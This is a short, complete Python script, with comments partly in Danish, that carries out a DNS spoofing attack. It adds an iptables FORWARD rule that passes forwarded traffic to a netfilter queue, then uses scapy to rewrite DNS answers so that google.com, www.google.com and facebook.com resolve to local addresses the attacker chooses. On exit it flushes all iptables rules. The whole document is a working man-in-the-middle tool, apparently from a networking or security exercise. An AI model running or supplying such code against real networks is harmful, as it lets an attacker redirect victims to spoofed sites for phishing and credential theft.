#!/usr/bin/python3

import os
from scapy.all import *
from netfilterqueue import NetfilterQueue 

dns_hosts = {
    b"www.google.com.": "192.168.1.100",
    b"google.com.": "192.168.18.128",
    b"facebook.com.": "172.217.19.142"
}

def process_packet(packet):
    """
    Whenever a new packet is redirected to the netfilter queue,
    this callback is called.
    """
    # Konverter netfilter queue pakke til scapy pakke
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # Hvis pakken er DNS Resource Record (DNS reply) skal den modificeres
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # not UDP packet, this can be IPerror/UDPerror packets
            pass
        print("[After ]:\n", scapy_packet.summary())
        # Konverter pakke til netfilter queue pakke igen før den bliver sendt afsted
        packet.set_payload(bytes(scapy_packet))
    packet.accept()

def modify_packet(packet):
    """
    Modifies the DNS Resource Record `packet` ( the answer part)
    to map our globally defined `dns_hosts` dictionary.
    For instance, whenever we see a google.com answer, this function replaces 
    the real IP address (172.217.19.142) with fake IP address (192.168.1.100)
    """
    # få domænets qname
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        # hvis qname ikke er en del af dns host variable
        # skal der ikke laves noget ved pakken
        print("no modification:", qname)
        return packet
    # Overskriv pakken med ip adresserne fra vores liste "dns_hosts[qname]"
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # answer count til 1
    packet[DNS].ancount = 1
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required ( scapy will do automatically )
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # return the modified packet
    return packet

QUEUE_NUM = 0
# insert the iptables FORWARD rule
os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
# instantiate the netfilter queue
queue = NetfilterQueue()

try:
    # bind the queue number to our callback `process_packet`
    # and start it
    queue.bind(QUEUE_NUM, process_packet)
    queue.run()
except KeyboardInterrupt:
    #Clean iptables
    print ("Cleaning IP tables")
    os.system("iptables --flush")